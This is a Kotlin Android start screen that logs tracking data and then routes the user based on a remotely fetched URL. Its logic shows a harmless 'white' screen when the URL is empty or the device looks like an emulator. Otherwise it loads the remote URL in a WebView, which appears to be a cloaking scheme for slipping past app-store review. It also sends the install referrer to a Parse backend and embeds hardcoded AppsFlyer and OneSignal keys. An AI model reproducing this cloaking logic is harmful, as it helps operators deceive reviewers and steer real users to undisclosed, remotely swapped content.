package aaa.bbb.novemberaver

import aaa.bbb.novemberaver.databinding.ActivityStartBinding
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.RemoteException
import android.telephony.TelephonyManager
import android.util.Log
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.appsflyer.AppsFlyerLib
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.onesignal.OneSignal
import com.parse.ParseObject

class StartActivity : AppCompatActivity() {
    private lateinit var binding: ActivityStartBinding
    private var url: String = ""
    private var progressStatus = 0
    private var handler = Handler()
    private var ref = ""
    private val key = "Vv5VexeuMZDJXdd5T3a2DX"
    val ONESIGNAL_APP_ID = "2cb8540a-8407-47f3-9743-ca917f560131"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityStartBinding.inflate(layoutInflater)
        setContentView(binding.root)
        init()
        Thread(Runnable {
            while (progressStatus < 100){

               progressStatus +=1

                Thread.sleep(30)

                handler.post {
                    binding.loadingPanel.progress = progressStatus
                }
            }
        }).start()
        Handler().postDelayed({

        if (url.isEmpty()) {
            loadFire()
        } else {
            val intent = Intent(this, WebViewActivity::class.java)
            startActivity(intent)
        } }, 2000)

        AppsFlyerLib.getInstance().init(key, null, this)
        AppsFlyerLib.getInstance().start(this)

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)

        OneSignal.initWithContext(this)
        OneSignal.setAppId(ONESIGNAL_APP_ID)

        val referrerClient: InstallReferrerClient = InstallReferrerClient.newBuilder(this).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {

            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> {
                        var response: ReferrerDetails? = null
                        try {
                            response = referrerClient.installReferrer
                            val referrerUrl: String = response.installReferrer
                            referrerClient.endConnection()

                            ref = referrerUrl
                            Log.d("Info", ref)
                            val firstObject = ParseObject("RefClass")
                            firstObject.put("message", ref)
                            firstObject.saveInBackground {
                                if (it != null) {
                                    it.localizedMessage?.let { message ->
                                        Log.e(
                                            "MainActivity",
                                            message
                                        )
                                    }
                                } else {
                                    Log.d("MainActivity", "Object saved.")
                                }
                            }
                        } catch (e: RemoteException) {
                            e.printStackTrace()
                        }
                    }
                    InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> {
                        Log.d("Info", "none")
                    }
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> {
                        Log.d("Info", "wait")
                    }
                }
            }

            override fun onInstallReferrerServiceDisconnected() {

            }
        })

    }

    private fun loadFire() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    url = remoteConfig.getString("url")
                    val f = Build.MANUFACTURER
                    Log.d("build", f)
                    val telMgr = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                    val simState: Int = telMgr.simState
                    Log.d("sim", simState.toString())
                    //   || Build.MANUFACTURER == "unknown" || simState != 5
                    if (url.isEmpty() || Build.MANUFACTURER == "unknown") {
                        val intent = Intent(this, WhiteActivity::class.java)
                        startActivity(intent)
                    }
                    else {
                        val intent = Intent(this, WebViewActivity::class.java)
                        intent.putExtra("refer", ref)
                        startActivity(intent)
                        val pref: SharedPreferences =
                            getSharedPreferences("Data", MODE_PRIVATE)
                        val editor = pref.edit()
                        editor.putString("2", url).apply()
                    }
                } else {
                    val intent = Intent(this, WhiteActivity::class.java)
                    startActivity(intent)
                }
            }
    }

    private fun init(){
        val pref: SharedPreferences =
            getSharedPreferences("Data", MODE_PRIVATE)
        val editor = pref.edit()
        editor.putString("2", url).apply()
        url = pref.getString("2", url)!!
    }
}